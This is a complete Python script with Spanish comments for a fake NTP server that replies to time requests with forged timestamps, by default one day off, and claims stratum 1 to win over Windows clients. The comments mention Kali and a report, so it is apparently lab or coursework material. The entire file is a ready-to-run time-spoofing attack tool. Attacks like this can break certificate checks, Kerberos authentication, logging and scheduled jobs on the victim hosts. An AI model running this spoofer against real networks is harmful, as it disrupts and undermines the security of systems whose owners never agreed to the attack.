#!/usr/bin/env python3
# fake_ntp_improved.py
import socket
import struct
import time
import sys

HOST = '0.0.0.0'
PORT = 123

# CAMBIO 1: Desfase por defecto de 1 día (86400 segundos) para un impacto claro.
# Puedes pasarle otro valor por argumento si quieres (ej: python3 fake_ntp_improved.py 3600)
OFFSET = 86400 

if len(sys.argv) > 1:
    try:
        OFFSET = int(sys.argv[1])
    except: pass

NTP_DELTA = 2208988800

def unix_to_ntp_parts(ts):
    ntp = ts + NTP_DELTA
    sec = int(ntp) & 0xFFFFFFFF
    frac = int((ntp - int(ntp)) * (1 << 32)) & 0xFFFFFFFF
    return sec, frac

def hex8(b): return ' '.join(f'{x:02x}' for x in b)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
print(f"[*] Servidor Fake NTP escuchando en {HOST}:{PORT}")
print(f"[*] Desfase configurado: {OFFSET} segundos ({OFFSET/3600:.2f} horas)")

while True:
    data, addr = s.recvfrom(1024)
    if not data or len(data) < 48:
        print("[-] Paquete ignorado (demasiado corto) de:", addr)
        continue

    # Extraer el Transmit Timestamp del cliente (bytes 40 al 47)
    client_tx = data[40:48]  

    recv_time = time.time()
    tx_time = recv_time + OFFSET  # Aplicamos el engaño temporal

    # Construir las marcas de tiempo en formato NTP
    rx_sec, rx_frac = unix_to_ntp_parts(recv_time)
    tx_sec, tx_frac = unix_to_ntp_parts(tx_time)
    ref_sec, ref_frac = unix_to_ntp_parts(tx_time - 10)  # Referencia simulada válida

    # Retraso y dispersión de la raíz (Root delay/dispersion)
    root_delay = int(0.02 * (1 << 16)) & 0xFFFFFFFF
    root_disp = int(0.02 * (1 << 16)) & 0xFFFFFFFF

    pkt = bytearray(48)
    
    # CAMBIO 2: LI = 0 (Sin advertencias), VN = 3 (NTP v3 para máxima compatibilidad con Windows)
    # Mode = 4 (Server) -> (0<<6) | (3<<3) | 4 = 0x1C (28 en decimal)
    pkt[0] = (0 << 6) | (3 << 3) | 4  
    
    # CAMBIO 3: Stratum = 1 (Reloj de máxima prioridad para engañar al algoritmo de Windows)
    pkt[1] = 1  
    pkt[2] = 6     # Polling interval
    pkt[3] = 0xFA  # Precisión del reloj (-6)

    # Empaquetar datos en la estructura de red (Big-Endian '!')
    struct.pack_into('!I', pkt, 4, root_delay)
    struct.pack_into('!I', pkt, 8, root_disp)
    struct.pack_into('!II', pkt, 12, ref_sec, ref_frac)

    # El campo Originate Timestamp DEBE ser idéntico al Transmit Timestamp del cliente
    pkt[24:32] = client_tx
    
    struct.pack_into('!II', pkt, 32, rx_sec, rx_frac) # Receive Timestamp
    struct.pack_into('!II', pkt, 40, tx_sec, tx_frac) # Transmit Timestamp

    # Consola de depuración (Ideal para mostrar en tu informe o capturas de pantalla)
    print("\n[+] Petición NTP interceptada desde:", addr)
    print("    Hora real en Kali:    ", time.ctime(recv_time))
    print("    Hora falsa enviada:   ", time.ctime(tx_time))
    print("    Coincidencia Orig/Tx: ", pkt[24:32] == client_tx)
    sys.stdout.flush()

    # Enviar respuesta UDP falsa
    s.sendto(bytes(pkt), addr)